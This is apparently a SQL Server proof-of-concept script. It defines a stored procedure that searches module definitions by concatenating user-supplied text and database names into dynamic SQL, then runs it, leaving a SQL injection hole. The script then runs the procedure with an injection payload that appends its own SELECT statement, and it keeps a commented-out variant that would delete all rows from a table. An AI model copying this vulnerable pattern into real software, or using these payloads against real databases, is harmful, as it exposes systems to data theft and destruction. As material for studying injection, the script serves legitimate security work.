USE PoCs;
GO
CREATE PROCEDURE [dbo].[find_text_in_sp]  
  @text varchar(250),  
  @dbname varchar(64) = null  
AS BEGIN  
SET NOCOUNT ON;  
  
if @dbname is null  
  begin  
    --enumerate all databases.  
  DECLARE #db CURSOR FOR Select Name from master..sysdatabases  
  declare @c_dbname varchar(64)  
  
  OPEN #db FETCH #db INTO @c_dbname  
  while @@FETCH_STATUS <> -1 --and @MyCount < 500  
   begin  
     execute find_text_in_sp @text, @c_dbname  
     FETCH #db INTO @c_dbname  
   end    
  CLOSE #db DEALLOCATE #db  
 end --if @dbname is null  
else  
 begin --@dbname is not null  
  declare @sql varchar(250)  
  --create the find like command  
  select @sql = 'select ''' + @dbname + ''' as db, o.name,m.definition '  
  select @sql = @sql + ' from '+@dbname+'.sys.sql_modules m '  
  select @sql = @sql + ' inner join '+@dbname+'..sysobjects o on m.object_id=o.id'  
  select @sql = @sql + ' where [definition] like ''%'+@text+'%'''  
  execute (@sql)  
 end --@dbname is not null  
END
GO


-- payload no destructivo
DECLARE @payload VARCHAR(250) = '%''; SELECT ''pwned''; --';

--DECLARE @payload VARCHAR(250) = '%'';DELETE FROM Items; --';

PRINT 'Payload (valor real):';
PRINT @payload;

EXEC dbo.find_text_in_sp @text = @payload, @dbname = 'PoCs';
